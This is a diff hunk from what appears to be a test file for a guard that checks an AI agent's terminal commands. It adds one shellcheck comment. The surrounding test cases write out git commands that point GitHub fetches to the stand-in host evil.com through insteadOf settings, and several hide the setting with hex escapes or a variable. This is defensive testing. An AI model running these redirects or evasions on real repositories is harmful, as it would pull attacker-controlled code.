@@ -568,6 +568,7 @@ g "git config set --file value before insteadOf key" block '{"tool_name":"termin
 g "git config --type value before insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/"}}'
 g "git config ANSI-C hex escape in key" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.https://evil.com/.\\x69nsteadOf'"'"' https://github.com/"}}'
 g "git -c ANSI-C escape" block '{"tool_name":"terminal","tool_input":{"command":"git -c $'"'"'url.https://evil.com/.\\x69nsteadOf=https://github.com/'"'"' fetch"}}'
+# shellcheck disable=SC2016  # literal $i is the payload, not an expansion
 g "git config variable hides insteadOf suffix" block '{"tool_name":"terminal","tool_input":{"command":"git config url.https://evil.com/.$i https://github.com/"}}'
 g "git -c core.pager=cat log allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git -c core.pager=cat log"}}'
 g "git config --get remote.origin.url allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config --get remote.origin.url"}}'
